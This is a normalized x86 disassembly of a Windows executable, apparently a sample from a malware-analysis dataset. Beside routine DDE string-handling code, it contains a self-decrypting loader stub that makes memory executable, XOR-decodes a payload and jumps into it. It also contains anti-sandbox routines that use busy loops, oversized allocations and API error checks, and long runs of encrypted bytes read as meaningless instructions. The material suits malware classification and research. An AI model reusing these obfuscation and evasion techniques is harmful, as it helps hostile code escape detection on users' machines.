call sub_486180
test eax eax
je r-xdata
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x100c ]
lea edx [ ebp - 0x1008 ]
mov ecx 0x1000
call sub_40431c
mov eax [ ebp - 0x100c ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_48605c
mov ebx eax
test ebx ebx
je r-xdata
mov dx [ ebp + 0x8 ]
call sub_48624c
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_486050
lea eax [ ebp - 0x100c ]
call sub_4040ac
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push 0x0
movzx eax [ ebp + 0x8 ]
push eax
push esi
push 0x0
mov eax [ ebp - 0x8 ]
call sub_40436c
inc eax
push eax
mov eax [ ebp - 0x8 ]
call sub_40456c
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov [ ebp - 0x4 ] eax
sub_48605c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov edi edx
test edi edi
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax edi
call sub_421994
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
inc esi
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4044b8
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x4 ]
inc [ ebp - 0x10 ]
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48605c
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_421968
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
sub_486130
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x44 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_4189b0
mov ebx eax
mov eax [ ebx + 0x34 ]
mov edx [ esp ]
call sub_4044b8
jne r-xdata
sub_486180
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x44 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_4189b0
mov ebx eax
mov eax [ esp ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call DdeCmpStringHandles
test eax eax
jne r-xdata
sub_4861d4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x30 ] ecx
xor edx edx
mov eax esi
call sub_421370
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_48620c
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4213bc
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ esi + 0x38 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_48624c
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403a2c#3
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1004 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1004 ]
lea eax [ ebx + 0x34 ]
call sub_40419c
cmp si 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_486308
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push 0x0
movzx eax si
push eax
mov eax [ ebx + 0x38 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_40436c
inc eax
push eax
mov eax [ ebp - 0x4 ]
call sub_40456c
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov edi eax
sub_486330
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_404100
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
call sub_40436c
test eax eax
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
push 0x3ec
mov eax [ ebx + 0x34 ]
call sub_40456c
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x38 ] eax
sub_48638c
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403a2c#2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4863c4
retn
mov eax rw-data
call sub_40d564
sub_4863c8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_48421c
mov [ rw-data ] eax
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418030
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418030
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418030
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418030
sub_486430
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ edi + 0x48 ] ah
add [ ebp + 0x48 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
dec ax
add [ ebx + eax ] al
add [ ecx + edx * 2 ] dl
inc esi
add al ah
sbb al [ edx ]
push eax
jge r-xdata
jpo r-xdata
add [ edi + edi * 2 ] al
inc esi
add ah dh
xor al 0x40
add [ eax - 0x5d ] dh
inc esi
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ edi + edi * 2 + 0x46 ] ch
add [ ebx + ebp * 2 + 0x45 ] ch
add ah bl
test [ esi ] al
lodsb [ esi ]
pop [ ecx ]
sub al 0x81
inc esi
add [ eax - 0x7f ] ch
inc esi
add [ edx + eax * 4 + 0x46 ] dh
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
in al dx
mov al [ esi ]
fcom [ edi ]
inc edx
add [ esi + eax * 8 + 0x7bc40046 ] cl
inc esi
mov eax [ esi ]
test al 0x1b
inc ebp
add [ eax + 0x4400455e ] cl
pop edi
inc ebp
add [ eax + 0x5a ] al
inc ebp
add [ eax ] ch
pop edi
inc ebp
add ah al
jpe r-xdata
add [ eax - 0x63ffba9a ] al
imul eax [ ebp ] 0xffffffe8
push 0x45
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add ah cl
xchg [ esi ] eax
xor al 0x5e
inc ebp
add al ah
0xeae40044 0x44
add [ esi ] 0xcc
add al dl
xchg ecx eax
inc esi
add ah dh
xor al 0x45
add [ esi + ebx * 4 - 0x5e0bffba ] dl
inc esi
add [ eax - 0x73ffb960 ] dh
xor eax 0x35900045
inc ebp
add [ ebx ] ch
inc esi
add al dh
xor eax [ ebp ]
push 0x20004560
stosb [ edi ]
inc esi
add [ edx + esi * 2 + 0x45 ] bl
add ah ah
pop esp
inc ebp
add [ edi + edi * 4 ] dh
inc esi
add [ eax + 0x68004674 ] bh
ja r-xdata
jo r-xdata
add [ esi ] 0x14
retn
add [ eax + esi * 4 ] dl
inc esi
add [ eax - 0x80 ] dl
inc esi
add ah cl
add eax [ eax ]
add [ edi ] al
outsb
jne r-xdata
outsb
je r-xdata
sbb [ ebx ] al
add [ eax ] al
or [ eax ] al
or edx [ edx + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ ebx + eax ] ebx
jne r-xdata
add [ ebx ] al
add [ eax ] al
add al [ eax ]
add eax 0x74696445
xor [ ebx + eax ] eax
add [ eax ] al
add eax [ eax ]
push es
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ eax ] ecx
add eax [ eax ]
add [ eax + eax ] al
pop es
inc edx
jne r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
je r-xdata
xor [ ebx + eax ] esi
add [ eax ] al
str [ esi ]
dec eax
popad
jb r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x32031
insd
inc edx
outsd
js r-xdata
push cs
je r-xdata
xor [ esi ] eax
outsd
outsb
cmp [ ebx ] al
add [ eax ] al
adc [ eax ] al
or al 0x49
insd
xor [ ebx + eax ] esp
add [ eax ] al
or eax [ eax ]
push esp
jb r-xdata
jb r-xdata
sub al 0x3
add [ eax ] al
or eax 0x61440f00
je r-xdata
jo r-xdata
adc [ ebx ] al
add [ eax ] al
push es
add [ edx ] cl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
inc esp
push ebx
add [ ebx ] cl
add [ esi ] cl
outsb
xor [ ebx + eax ] ecx
add [ eax ] al
add eax 0x72470900
outsd
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
add esp 0xfffffff8
push ebx
push esi
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
xor [ ebx ] edx
add [ eax ] bl
out 0x45 eax
add ah bh
jmp 0x1d74671c
aaa
dec ebp
popad
jo r-xdata
outsd
insb
xor [ eax ] edi
add eax [ eax ]
add [ eax ] dl
add [ ecx + ecx * 2 ] cl
inc ebx
add al ah
test [ edi ] 0x68
out 0x47 al
add [ ecx + ebx * 8 + 0x47 ] bl
add al dh
cmp eax [ ebx ]
fcomp [ esi ]
inc esi
add [ ecx + edx * 2 + 0x3bf00043 ] ch
inc ebx
add ah bl
push ds
aam 0xb
inc esp
add [ edi + eax * 2 + 0x44 ] cl
add [ eax + 0x2c ] cl
inc esp
add [ esp + ebx * 8 - 0x4c17ffbe ] ah
inc ebp
add [ eax + 0x50004837 ] dh
inc eax
add eax [ eax ]
add [ edx ] dl
add [ 0x4f516449 ] cl
push esp
jb r-xdata
je r-xdata
inc esp
push ebx
jb r-xdata
push esp
imul ebp [ ebp + 0x65 ] 0x6b636950
jb r-xdata
jb r-xdata
push ebx
add [ eax ] al
or [ eax ] eax
or eax [ ecx + 0x63 ]
je r-xdata
sbb al 0x3
jae r-xdata
add [ ecx ] cl
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
adc al 0x3
add [ eax ] al
pop es
push r-xdata
call sub_48673c
push ebp
mov edx 0x65dad566
jo r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x5199
push ebx
call VirtualProtect
xor eax eax
mov [ 0x4ebea3a3 ] eax
mov ebx edx
shr [ eax ] 0x33
xor esp [ ebx - 0x25cfa65d ]
xor [ eax + 0x64 ] edi
dec eax
add [ edx + edx * 2 + 0x46 ] bl
add [ esi ] bl
add eax 0x74696e55
add [ ebp + 0x67200040 ] cl
dec eax
add [ edi ] al
push es
push esp
inc esi
outsd
jb r-xdata
inc edi
insb
outsb
je r-xdata
push esp
jb r-xdata
add [ eax ] al
adc [ eax ] eax
cmovns esp [ ebp + ecx * 2 + 0x61 ]
jo r-xdata
xor [ eax ] ebp
add eax [ eax ]
add [ eax + eax ] cl
or al 0x4d
imul esp [ fs : ecx + 0x50 ] 0x6579616c
jb r-xdata
insd
jo r-xdata
xor [ ebx ] al
add [ eax ] al
push cs
add [ ecx ] cl
je r-xdata
add [ edx ] cl
add [ esi ] cl
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x65744974
xor [ eax ] esp
add eax [ eax ]
cdq
pop es
xor esi [ ebx ]
mov [ 0xffffffffb13ca3a3 ] eax
test [ eax ] 0x33
xor ebx [ ecx + 0x33 ]
fimul [ edx + 0x10 ]
xor esi [ ebx ]
mov [ 0x62a3a3a3 ] eax
fcmovb st2
pop es
xor esi [ ebx ]
mov [ 0x65a3f0fa ] eax
fidivr [ ebx ]
jl r-xdata
xor esp [ ebx - 0x5c5c5c5d ]
lea esi [ eax + ebx ]
mov dl [ esi ]
xor dl 0x33
mov [ esi ] dl
inc eax
cmp eax 0x519a
jne r-xdata
add ebx 0x1179
mov [ ebp - 0x4 ] ebx
jmp [ ebp - 0x4 ]
dec eax
add [ eax + 0x3a ] dl
dec eax
add [ eax ] bl
or al 0x48
mov al 0x37
push esp
inc esi
outsd
jb r-xdata
push es
cmp cl [ eax ]
sbb [ eax + ecx * 2 ] cl
push esp
push eax
xor [ ebx + eax ] edi
inc esi
jge r-xdata
xor esp [ ebx - 0x204d2048 ]
pop ds
xor [ ebx ] esi
xor ebx [ ecx + 0x9 ]
imul ebx [ ecx + 0x69 ] 0x55
mov edx 0x596bef76
pop esp
fisub [ ebx + 0x11 ]
xor esi [ ebx ]
mov [ 0xffffffffb66aa3a3 ] eax
ficomp [ ecx ]
arpl [ ebx ] si
xor esp [ ebx - 0x25c53750 ]
daa
jae r-xdata
push ebp
mov edx 0x596bed76
sbb eax 0xd376ba55
imul ebx [ ecx + 0x51 ] 0xffffffda
dec edi
sbb al 0x33
xor esp [ ebx + 0x72dbf5b8 ]
xor esp [ ebx + 0x3397a4cc ]
push ebp
mov edx 0x596bef76
inc ebx
xor esi [ ebx ]
add bl dh
insd
push 0x332fe4da
xor eax [ eax ]
fcmovbe st4
xor [ ebx ] dh
xor esp [ ebx + 0x57da6ba3 ]
cmp eax 0xa3a33333
ficomp [ eax + 0x5 ]
xor esi [ ebx ]
mov [ 0xffffffffa3a3a3a3 ] eax
xor esp [ ebx + 0x7d86daa3 ]
xor esi [ ebx ]
mov [ 0x3397a4cc ] eax
xor [ ebx ] dh
xor ebp [ edx + 0x6a ]
mov eax 0x3de3dacb
xor esi [ ebx ]
mov [ 0xffffffffa3a3a3a3 ] eax
push ebp
mov edx 0xba55cb76
jle r-xdata
fimul [ edi + 0x1c ]
xor esi [ ebx ]
mov [ 0x72dbf5b8 ] eax
sub_4866d7
inc esp
add [ eax + 0x54004414 ] dl
cmp [ eax + eax - 0x2c ] al
or eax [ eax + eax + 0x4c ]
inc edi
inc esp
add [ eax + 0x2c ] cl
inc esp
add [ esp + ebx * 8 - 0x4c17ffbe ] ah
inc ebp
add [ eax + 0x50004837 ] dh
cmp cl [ eax ]
sbb [ eax + ecx * 2 ] cl
add [ ecx + edx * 2 + 0x3bf00043 ] ch
inc ebx
add ah bl
push ds
inc ebx
add al ah
test [ edi ] 0x68
out 0x47 al
add [ ecx + ebx * 8 + 0x47 ] bl
add [ ebp + 0x67200040 ] cl
dec eax
add [ edi ] al
push es
push esp
inc esi
outsd
jb r-xdata
mov [ 0x4ebea3a3 ] eax
mov ebx edx
shr [ eax ] 0x33
xor esp [ ebx - 0x25cfa65d ]
xor [ eax + 0x64 ] edi
dec eax
add [ edx + edx * 2 + 0x46 ] bl
add [ esi ] bl
add eax 0x74696e55
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
add esp 0xfffffff8
push ebx
push esi
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push r-xdata
call sub_48673c
push ebp
mov edx 0x65dad566
jo r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x5199
push ebx
call VirtualProtect
xor eax eax
cdq
pop es
xor esi [ ebx ]
mov [ 0xffffffffb13ca3a3 ] eax
test [ eax ] 0x33
xor ebx [ ecx + 0x33 ]
fimul [ edx + 0x10 ]
xor esi [ ebx ]
mov [ 0x62a3a3a3 ] eax
fcmovb st2
pop es
xor esi [ ebx ]
mov [ 0x65a3f0fa ] eax
fidivr [ ebx ]
jl r-xdata
xor esp [ ebx - 0x5c5c5c5d ]
lea esi [ eax + ebx ]
mov dl [ esi ]
xor dl 0x33
mov [ esi ] dl
inc eax
cmp eax 0x519a
jne r-xdata
add ebx 0x1179
mov [ ebp - 0x4 ] ebx
jmp [ ebp - 0x4 ]
jge r-xdata
xor esp [ ebx - 0x204d2048 ]
pop ds
xor [ ebx ] esi
xor ebx [ ecx + 0x9 ]
imul ebx [ ecx + 0x69 ] 0x55
mov edx 0x596bef76
pop esp
fisub [ ebx + 0x11 ]
xor esi [ ebx ]
mov [ 0xffffffffb66aa3a3 ] eax
ficomp [ ecx ]
arpl [ ebx ] si
xor esp [ ebx - 0x25c53750 ]
daa
jae r-xdata
push ebp
mov edx 0x596bed76
sbb eax 0xd376ba55
imul ebx [ ecx + 0x51 ] 0xffffffda
dec edi
sbb al 0x33
xor esp [ ebx + 0x72dbf5b8 ]
xor esp [ ebx + 0x3397a4cc ]
push ebp
mov edx 0x596bef76
inc ebx
xor esi [ ebx ]
add bl dh
insd
push 0x332fe4da
xor eax [ eax ]
fcmovbe st4
xor [ ebx ] dh
xor esp [ ebx + 0x57da6ba3 ]
cmp eax 0xa3a33333
ficomp [ eax + 0x5 ]
xor esi [ ebx ]
mov [ 0xffffffffa3a3a3a3 ] eax
xor esp [ ebx + 0x7d86daa3 ]
xor esi [ ebx ]
mov [ 0x3397a4cc ] eax
xor [ ebx ] dh
xor ebp [ edx + 0x6a ]
mov eax 0x3de3dacb
xor esi [ ebx ]
mov [ 0xffffffffa3a3a3a3 ] eax
push ebp
mov edx 0xba55cb76
jle r-xdata
fimul [ edi + 0x1c ]
xor esi [ ebx ]
mov [ 0x72dbf5b8 ] eax
sub_48673c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push r-xdata
call sub_48673c
push ebp
mov edx 0x65dad566
jo r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x5199
push ebx
call VirtualProtect
xor eax eax
cdq
pop es
xor esi [ ebx ]
mov [ 0xffffffffb13ca3a3 ] eax
test [ eax ] 0x33
xor ebx [ ecx + 0x33 ]
fimul [ edx + 0x10 ]
xor esi [ ebx ]
mov [ 0x62a3a3a3 ] eax
fcmovb st2
pop es
xor esi [ ebx ]
mov [ 0x65a3f0fa ] eax
fidivr [ ebx ]
jl r-xdata
xor esp [ ebx - 0x5c5c5c5d ]
mov [ 0x4ebea3a3 ] eax
mov ebx edx
shr [ eax ] 0x33
xor esp [ ebx - 0x25cfa65d ]
lea esi [ eax + ebx ]
mov dl [ esi ]
xor dl 0x33
mov [ esi ] dl
inc eax
cmp eax 0x519a
jne r-xdata
add ebx 0x1179
mov [ ebp - 0x4 ] ebx
jmp [ ebp - 0x4 ]
jge r-xdata
xor esp [ ebx - 0x204d2048 ]
pop ds
xor [ ebx ] esi
xor ebx [ ecx + 0x9 ]
imul ebx [ ecx + 0x69 ] 0x55
mov edx 0x596bef76
pop esp
fisub [ ebx + 0x11 ]
xor esi [ ebx ]
mov [ 0xffffffffb66aa3a3 ] eax
ficomp [ ecx ]
arpl [ ebx ] si
xor esp [ ebx - 0x25c53750 ]
daa
jae r-xdata
push ebp
mov edx 0x596bed76
sbb eax 0xd376ba55
imul ebx [ ecx + 0x51 ] 0xffffffda
dec edi
sbb al 0x33
xor esp [ ebx + 0x72dbf5b8 ]
xor esp [ ebx + 0x3397a4cc ]
push ebp
mov edx 0x596bef76
inc ebx
xor esi [ ebx ]
add bl dh
insd
push 0x332fe4da
xor eax [ eax ]
fcmovbe st4
xor [ ebx ] dh
xor esp [ ebx + 0x57da6ba3 ]
cmp eax 0xa3a33333
ficomp [ eax + 0x5 ]
xor esi [ ebx ]
mov [ 0xffffffffa3a3a3a3 ] eax
xor esp [ ebx + 0x7d86daa3 ]
xor esi [ ebx ]
mov [ 0x3397a4cc ] eax
xor [ ebx ] dh
xor ebp [ edx + 0x6a ]
mov eax 0x3de3dacb
xor esi [ ebx ]
mov [ 0xffffffffa3a3a3a3 ] eax
push ebp
mov edx 0xba55cb76
jle r-xdata
fimul [ edi + 0x1c ]
xor esi [ ebx ]
mov [ 0x72dbf5b8 ] eax
sub_486ce1
push ebp
mov edx 0x596b2776
pop esp
imul ebx [ ecx + 0x50 ] 0x2576ba55
mov eax 0x76ba55f1
sub ebp [ ebx - 0x26 ]
aad 0x1c
xor esi [ ebx ]
push ebp
mov edx 0x5659e176
fidiv [ eax + 0x21 ]
xor esi [ ebx ]
mov [ 0x1491da6b ] eax
xor esi [ ebx ]
cmp al 0xb7
fwait
xor esi [ ss : ebx ]
ficomp [ esi - 0x5ccccce9 ]
push 0xcc63f0fa
inc ebp
arpl [ edx + 0x6cdae76e ] di
sub [ ebx ] dh
xor esi [ esi + 0x2bb73cf3 ]
xor esi [ ebx ]
xor ebx [ ecx + 0x33 ]
int3
sub_488584
push 0xffffffda
fwait
xor esi [ ss : ebx ]
mov [ 0xffffffffa3a3a3a3 ] eax
mov eax 0xa3f06ed6
imul edx [ ebp - 0x46 ] 0xa1daad66
push ds
xor esi [ ebx ]
mov [ 0xffffffffdfb866a3 ] eax
mov dl 0xdf
pop ds
xor [ ebx ] esi
xor esp [ eax + 0x59 ]
aaa
pop ebx
xor eax [ ebx ]
xor esi [ ebx ]
pop ebx
jecxz r-xdata
fidivr [ esi + 0x31 ]
xor esi [ ebx ]
mov [ 0x33038a62 ] eax
xor esi [ ebx ]
push edi
mov eax 0x3f73b832
mov eax 0x33b83f73
mov eax 0xde48da33
int3
xor dh [ ebx ]
fiadd [ 0xffffffffa3ccccde ]
mov [ 0x64a3a3a3 ] eax
int3
sub_4885e5
push 0xffffffda
jle r-xdata
push ebx
ror esp 0xcc
mov dh 0xf3
cmp al 0xb6
cmp esp edx
int3
xor esi [ ebx ]
mov [ 0x33038a62 ] eax
xor esi [ ebx ]
push edi
mov eax 0x3f73b832
mov eax 0x33b83f73
mov eax 0xde48da33
int3
sub_488963
xor esi [ ebx ]
pop ebx
aam 0x34
mov bl 0xc6
mov edx 0x3333a7b5
xor ebx ebx
sbb [ esi ] bh
xor esi [ ebx ]
pop ebx
sub bh ah
arpl [ ecx + 0x64 ] dx
mov edx 0x333397b5
xor ebx edx
mov edx 0xa3ccccc9
mov [ 0xffffffffa3a3a3a3 ] eax
mov eax 0xdaccb6eb
nop
fmul st4
int3
sub_488f93
push ebp
mov al 0x48
jne r-xdata
xor edi [ ebx - 0x258ccdd9 ]
mov bh 0xcd
int3
mov esi 0xb73c300f
xor esi [ es : ebx ]
xor esi [ eax + 0x3227174f ]
cmp al 0xb7
cmp [ ebx ] esi
xor esi [ ebx ]
mov al 0x4c
adc esi [ edx ]
cmp al 0xb6
adc ah al
int3
sub_489610
push 0xba554759
outsb
xchg ebp eax
push 0xba554059
outsb
fwait
push 0x996eba55
mov eax 0x555059ea
mov edx 0x55689f6e
mov edx 0x40599d6e
push ebp
mov edx 0x596a8d7e
inc edi
push ebp
mov edx 0x596af17e
inc esi
push ebp
mov edx 0xecb8f77e
ficomp [ ebp - 0x3f ]
int3
sub_489a99
push edi
pop edi
pop edi
sbb eax 0x57cf76f4
pop edi
pop edi
xor ecx esp
arpl [ ebx - 0x3c ] cx
jmp r-xdata
mov [ 0x646560a3 ] eax
mov eax 0x8e800cb
enter 0xb73c 0x4d
aam 0xcc
int3
sub_489b4f
and esp [ edx ]
xor esi [ ebx ]
push 0xffffffb6
fisub [ ebp - 0x5cccccdb ]
cmp al 0xb6
pop edi
xor esi [ cs : ebx ]
sbb [ edi + 0x17 ] dh
aaa
jpo r-xdata
and eax 0x3ca33333
mov dh 0x5f
cmp al 0xb6
xchg ebx eax
fxch st4
int3
sub_48aa04
push 0xffffffbe
jbe r-xdata
mov eax 0xda231767
jo r-xdata
arpl [ eax + 0x50da3b76 ] di
ror ah 0x1
int3
mov dh 0xf3
cmp al 0xb7
xchg edx eax
ror esp 0x1
int3
int3
sub_48ac9f
push ebp
mov edx 0x5969e566
adc edx [ ebp - 0x46 ]
jmp r-xdata
pushad
mov eax 0x33338f83
xor eax [ eax ]
call 0x3d0e62d5
mov ebp 0xccccf9b2
mov eax 0x3333f38b
xor edi [ eax - 0x47dce881 ]
in al 0xdb
pop esp
fxch st4
int3
sub_48aef0
push 0xffffffc4
jmp r-xdata
test esp 0x554b59cc
mov edx 0xba55cf76
jle r-xdata
push ebp
mov edx 0x8754227
retn
push 0xffffffbe
jbe r-xdata
int3
arpl [ eax - 0x45aac48a ] di
jle r-xdata
arpl [ eax - 0x26 ] sp
xchg esi eax
fild [ ebp - 0x32 ]
int3
sub_48afed
push ebp
mov al 0xa
adc ebx edx
inc eax
ror esp 0xcc
mov [ 0xffffffffdf46cca3 ] eax
fistp [ fs : ecx - 0x4f33331b ]
mul [ edi ]
mov dh 0xf3
cmp al 0xb7
push ebx
fcmove st4
int3
sub_48b928
push ebx
mov edx ecx
test edx edx
jbe r-xdata
xor eax eax
pop ebx
retn
mov ecx 0x1
mov ebx ecx
add ebx eax
mov [ ebx ] 0x8
inc ecx
dec edx
jne r-xdata
sub_48b944
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call CreateMDIWindowA
test eax eax
je r-xdata
nop
nop
call GetLastError
cmp eax 0x578
jne r-xdata
nop
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call EndMenu
nop
nop
mov ebx 0xb957ee6
nop
dec ebx
jne r-xdata
push 0x4
push 0x3000
push 0x1c86f923
push 0x0
call VirtualAlloc
mov ebx eax
nop
test ebx ebx
je r-xdata
mov ecx 0x1c86f923
xor edx edx
mov eax ebx
call sub_48b928
mov [ ebp - 0x4 ] eax
call EndMenu
push 0x8000
push 0x0
push ebx
call VirtualFree
nop
nop
mov ebx 0xaaae
call EndMenu
dec ebx
jne r-xdata
nop
nop
xor eax eax
push ebp
push j_sub_403778
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
div eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_48ba14
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403a2c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48ba40
retn
sub_48ba44
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi rw-data
xor eax eax
push ebp
push sub_48bbae
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48bbb5
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
push 0x0
push 0x0
call SelectClipRgn
call GetLastError
cmp eax 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_402a14
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40c7b4
test eax eax
jne r-xdata
nop
nop
nop
nop
jmp r-xdata
nop
mov ebx 0x1397
call EndMenu
dec ebx
jne r-xdata
mov ebx 0x27720
nop
call EndMenu
nop
dec ebx
jne r-xdata
push 0x4
push 0x3000
push 0x282f49e1
push 0x0
call VirtualAlloc
mov ebx eax
nop
nop
test ebx ebx
jne r-xdata
mov ecx 0x282f49e1
xor edx edx
mov eax ebx
call sub_48b928
call EndMenu
push 0x8000
push 0x0
push ebx
call VirtualFree
